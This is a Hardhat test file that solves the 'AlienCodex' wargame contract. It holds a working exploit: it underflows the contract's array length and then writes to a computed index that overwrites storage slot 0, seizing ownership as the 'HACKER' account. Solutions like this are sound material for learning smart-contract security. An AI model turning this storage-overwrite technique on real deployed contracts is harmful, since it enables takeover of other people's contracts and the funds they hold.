import { expect } from "chai";
import { ethers } from "hardhat";
import {utils} from "ethers";

describe("AlienCodex Test", function () {
    it("Should claimOwnerShip", async function() {
        const [OWNER, HACKER] = await ethers.getSigners();
        const AlienCodex = await ethers.getContractFactory("AlienCodex");
        const alienCodex = await AlienCodex.connect(OWNER).deploy();
        await alienCodex.deployed();

        await alienCodex.connect(HACKER).make_contact(); // now contact = true
        await alienCodex.connect(HACKER).retract(); // now the length of the array is 2^256
        expect(await alienCodex.contact()).to.be.true;
        
        // 0 = keccak(1) + 2^256mod2^256
        // 0 - keccak(1) mod 2^256 <=> 2^256 - keccak(1)

        // keccak(2)
        const mapDataBegin = ethers.BigNumber.from(
            ethers.utils.keccak256(
            `0x0000000000000000000000000000000000000000000000000000000000000001`
            )
        )
        //  need to find index at this location now that maps to 0 mod 2^256
        // i.e., 0 - keccak(1) mod 2^256 <=> 2^256 - keccak(1) as keccak(1) is in range
        const isCompleteOffset = ethers.BigNumber.from(`2`)
        .pow(`256`)
        .sub(mapDataBegin)

        const hackerAddr = await HACKER.getAddress();
        await alienCodex.revise(isCompleteOffset, utils.zeroPad(hackerAddr, 32));
        expect(await alienCodex.owner()).to.eq(hackerAddr);
    })
});
